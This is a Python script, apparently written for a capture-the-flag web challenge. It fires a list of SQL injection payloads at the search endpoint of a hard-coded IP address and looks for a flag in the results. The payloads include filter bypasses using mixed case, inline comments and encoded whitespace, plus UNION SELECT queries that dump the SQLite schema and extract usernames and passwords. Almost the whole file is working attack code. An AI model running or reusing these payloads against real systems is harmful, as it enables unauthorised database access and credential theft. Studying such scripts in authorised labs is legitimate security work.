import requests
import re
import os
import time

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("深度SQL注入测试（根据提示：很粗糙的关键字替换）")
print("="*70)

# 根据提示，搜索框做了很粗糙的关键字替换
# 尝试绕过这种关键字替换

sql_payloads = [
    # 基础payload
    ("' OR 1=1--", "基础OR"),
    ("' OR '1'='1", "基础OR2"),
    ("\" OR \"1\"=\"1", "双引号OR"),
    
    # 尝试绕过关键字替换（大小写）
    ("' oR 1=1--", "大小写混合"),
    ("' Or 1=1--", "大小写混合2"),
    ("' oR '1'='1", "大小写混合3"),
    
    # 尝试使用替代关键字
    ("' || 1=1--", "使用||代替OR"),
    ("' || '1'='1", "使用||代替OR2"),
    
    # 尝试使用Union Select（大小写混合）
    ("' UnIoN SeLeCt 1,2,3--", "Union大小写"),
    ("' unio%n selec%t 1,2,3--", "URL编码"),
    
    # 尝试使用注释绕过
    ("'/**/OR/**/1=1--", "注释绕过"),
    ("'/**/or/**//**/1=1--", "多注释"),
    
    # 尝试使用空格绕过
    ("' OR/**/1=1--", "空格替换"),
    ("' OR%0A1=1--", "换行符"),
    ("' OR%091=1--", "制表符"),
    ("' OR%201=1--", "空格编码"),
    
    # 尝试使用引号绕过
    ("' OR 1=1#", "使用#代替--"),
    ("' OR 1=1/*", "使用/*代替--"),
    
    # 尝试使用特殊SQL语法
    ("' HAVING 1=1--", "HAVING"),
    ("' GROUP BY 1--", "GROUP BY"),
    ("' ORDER BY 1--", "ORDER BY"),
    
    # 尝试提取数据库信息
    ("' UNION SELECT sqlite_version(),2,3--", "SQLite版本"),
    ("' UNION SELECT sqlite_master,2,3--", "SQLite表"),
    ("' UNION SELECT sql,2,3 FROM sqlite_master--", "SQLite schema"),
    ("' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'--", "SQLite表名"),
    ("' UNION SELECT group_concat(name),2,3 FROM sqlite_master WHERE type='table'--", "所有表名"),
    
    # 尝试提取特定表的数据
    ("' UNION SELECT *,2,3 FROM users--", "users表"),
    ("' UNION SELECT username,password,3 FROM users--", "users凭据"),
    ("' UNION SELECT username,password,role FROM users--", "users完整"),
    ("' UNION SELECT group_concat(username || ':' || password),2,3 FROM users--", "所有用户"),
    
    # 尝试查找flag表
    ("' UNION SELECT *,2,3 FROM flag--", "flag表"),
    ("' UNION SELECT *,2,3 FROM flags--", "flags表"),
    ("' UNION SELECT flag,2,3 FROM flag--", "flag列"),
    ("' UNION SELECT content,2,3 FROM flag--", "content列"),
    ("' UNION SELECT value,2,3 FROM flag--", "value列"),
    ("' UNION SELECT text,2,3 FROM flag--", "text列"),
    ("' UNION SELECT secret,2,3 FROM secrets--", "secrets表"),
    
    # 尝试查找隐藏表
    ("' UNION SELECT name,2,3 FROM sqlite_master WHERE name LIKE '%flag%'--", "查找flag表"),
    ("' UNION SELECT name,2,3 FROM sqlite_master WHERE name LIKE '%secret%'--", "查找secret表"),
    ("' UNION SELECT name,2,3 FROM sqlite_master WHERE name LIKE '%admin%'--", "查找admin表"),
    
    # 尝试使用盲注（Boolean based）
    ("' AND 1=1--", "AND True"),
    ("' AND 1=2--", "AND False"),
    
    # 尝试使用LIKE搜索
    ("flag", "直接搜索flag"),
    ("FLAG", "直接搜索FLAG"),
    ("%flag%", "LIKE搜索"),
    ("%FLAG%", "LIKE搜索2"),
    ("_flag_", "LIKE搜索3"),
]

for payload, desc in sql_payloads:
    try:
        r = session.get(f"{TARGET}/search", params={"q": payload}, timeout=15)
        
        if r.status_code == 200:
            # 提取所有搜索结果
            results = re.findall(r'<article[^>]*>.*?<h2>(.*?)</h2>.*?<p>(.*?)</p>.*?<small>(.*?)</small>', r.text, re.DOTALL)
            
            # 检查是否有异常结果
            if len(results) > 3:  # 正常搜索只有3个结果
                print(f"\n>>> {desc}: {payload}")
                print(f"⚠️ 发现更多结果: {len(results)}")
                
                for i, (title, content, owner) in enumerate(results):
                    print(f"  结果{i+1}: {title.strip()} | {content.strip()} | {owner.strip()}")
                
                # 搜索flag
                flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
            
            # 检查是否有错误信息
            if "error" in r.text.lower() or "sql" in r.text.lower():
                print(f"\n>>> {desc}: {payload}")
                print(f"⚠️ 可能有SQL错误")
                print(f"内容: {r.text[:300]}")
            
            # 检查响应是否包含数据库名称
            if "sqlite" in r.text.lower() or "users" in r.text.lower():
                print(f"\n>>> {desc}: {payload}")
                print(f"⚠️ 可能泄露数据库信息")
                print(f"内容: {r.text[:500]}")
    except:
        pass
    
    time.sleep(0.3)

print("\n测试完成")